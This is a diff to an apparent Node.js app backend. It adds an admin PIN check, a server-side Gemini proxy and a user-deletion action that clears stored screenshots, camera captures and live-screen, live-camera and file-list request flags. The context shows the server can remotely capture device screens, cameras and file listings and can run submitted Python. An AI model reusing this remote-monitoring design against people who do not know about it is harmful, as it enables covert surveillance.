@@ -1548,6 +1548,19 @@ const server = http.createServer(async (req, res) => {
       return sendJson(res, 200, publicConfig(cfg));
     }
 
+    // ---- POST /api/admin/panel-auth — Admin Panel APK PIN check.
+    // The panel app asks for the PIN on open; the PIN is verified HERE
+    // against the PANEL_PIN env var — never baked into the APK or source.
+    // Body {pin}; returns {ok:true} only when PANEL_PIN is set and matches.
+    // The PIN value is never logged.
+    if (req.method === "POST" && pathname === "/api/admin/panel-auth") {
+      const body = await readJsonBody(req);
+      const serverPin = process.env.PANEL_PIN || "";
+      const pin = String(body.pin || "");
+      if (!serverPin || !pin || pin !== serverPin) return sendJson(res, 200, { ok: false });
+      return sendJson(res, 200, { ok: true });
+    }
+
     // ---- POST /api/admin/message — send a notification/message to installs.
     // The app shows it as a system notification on its next heartbeat.
     if (req.method === "POST" && pathname === "/api/admin/message") {
@@ -1591,6 +1604,57 @@ const server = http.createServer(async (req, res) => {
       if (code.length > 20000) return sendJson(res, 400, { error: "code too long (max 20000 chars)" });
       const out = await runPython(code);
       return sendJson(res, 200, { ok: out.exit === 0 && !out.timedOut, ...out });
+    }
+
+    // ---- POST /api/agent/gemini — Gemini proxy (key server-side only).
+    // The phone sends {messages:[{role,content}], model?} and gets
+    // {ok:true, text} or {ok:false, error}. The Gemini API key comes ONLY
+    // from process.env.GEMINI_API_KEY (Render env) — never in code, never
+    // logged, never sent to the phone. Request body capped at ~32KB.
+    // Roles: system -> systemInstruction, assistant/model -> model, user -> user.
+    if (req.method === "POST" && pathname === "/api/agent/gemini") {
+      const body = await readJsonBody(req);
+      const key = process.env.GEMINI_API_KEY || "";
+      if (!key) return sendJson(res, 200, { ok: false, error: "no key" });
+      const msgs = Array.isArray(body.messages) ? body.messages : [];
+      if (!msgs.length) return sendJson(res, 400, { ok: false, error: "messages required" });
+      if (JSON.stringify(body).length > 32 * 1024) return sendJson(res, 400, { ok: false, error: "request too large (max 32KB)" });
+      const model = String(body.model || "gemini-2.0-flash").replace(/[^A-Za-z0-9._-]/g, "").slice(0, 80) || "gemini-2.0-flash";
+      let systemText = "";
+      const contents = [];
+      for (const m of msgs) {
+        const text = String((m && m.content) || "");
+        if (!text) continue;
+        const role = String((m && m.role) || "user");
+        if (role === "system") { systemText += (systemText ? "\n" : "") + text; continue; }
+        const gRole = (role === "assistant" || role === "model") ? "model" : "user";
+        if (contents.length > 0 && contents[contents.length - 1].role === gRole) {
+          contents[contents.length - 1].parts.push({ text });
+        } else {
+          contents.push({ role: gRole, parts: [{ text }] });
+        }
+      }
+      if (!contents.length) return sendJson(res, 400, { ok: false, error: "messages required" });
+      const payload = { contents };
+      if (systemText) payload.systemInstruction = { parts: [{ text: systemText }] };
+      let r;
+      try {
+        r = await fetch("https://generativelanguage.googleapis.com/v1beta/models/" + model + ":generateContent", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "x-goog-api-key": key },
+          body: JSON.stringify(payload),
+        });
+      } catch (e) {
+        return sendJson(res, 200, { ok: false, error: "Google unreachable: " + String(e.message || e).slice(0, 200) });
+      }
+      const j = await r.json().catch(() => ({}));
+      if (!r.ok) {
+        const msg = (j.error && j.error.message) || ("Google error " + r.status);
+        return sendJson(res, 200, { ok: false, error: String(msg).slice(0, 300) });
+      }
+      const parts = (j.candidates && j.candidates[0] && j.candidates[0].content && j.candidates[0].content.parts) || [];
+      const text = parts.map((p) => p.text || "").join("");
+      return sendJson(res, 200, { ok: true, text });
     }
 
     // ---- POST /api/admin/notify-email — email a user (or all users with an
@@ -1729,6 +1793,27 @@ const server = http.createServer(async (req, res) => {
       }
 
       if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+      if (action === "delete_user") {
+        const did = user.device_id || "";
+        delete users[installId];
+        if (did && devices[did]) delete devices[did];
+        saveUsers(users);
+        saveDevices(devices);
+        try { fs.unlinkSync(path.join(FILELIST_DIR, safeFileName(installId) + ".json")); } catch (e) {}
+        for (const dir of [SHOTS_DIR, CAM_DIR]) {
+          try {
+            fs.readdirSync(dir).forEach((f) => {
+              if (f.startsWith(safeFileName(installId))) { try { fs.unlinkSync(path.join(dir, f)); } catch (e) {} }
+            });
+          } catch (e) {}
+        }
+        const cfg2 = loadConfig();
+        for (const k of ["screenshot_requested", "camera_requested", "live_screen", "live_video", "live_camera", "file_list_requested"]) {
+          if (cfg2[k]) delete cfg2[k][installId];
+        }
+        saveConfig(cfg2);
+        return sendJson(res, 200, { ok: true, deleted: installId });
+      }
       if (action === "ban") {
         user.status = "banned";
         user.until = null;
@@ -1743,7 +1828,7 @@ const server = http.createServer(async (req, res) => {
         user.status = "ok";
         user.until = null;
       } else {
-        return sendJson(res, 400, { error: "unknown action (ban|suspend|shutdown|restore|ban_device|unban_device|request_screenshot)" });
+        return sendJson(res, 400, { error: "unknown action (ban|suspend|shutdown|restore|delete_user|ban_device|unban_device|request_screenshot)" });
       }
       saveUsers(users);
       return sendJson(res, 200, publicUser(user, devices));
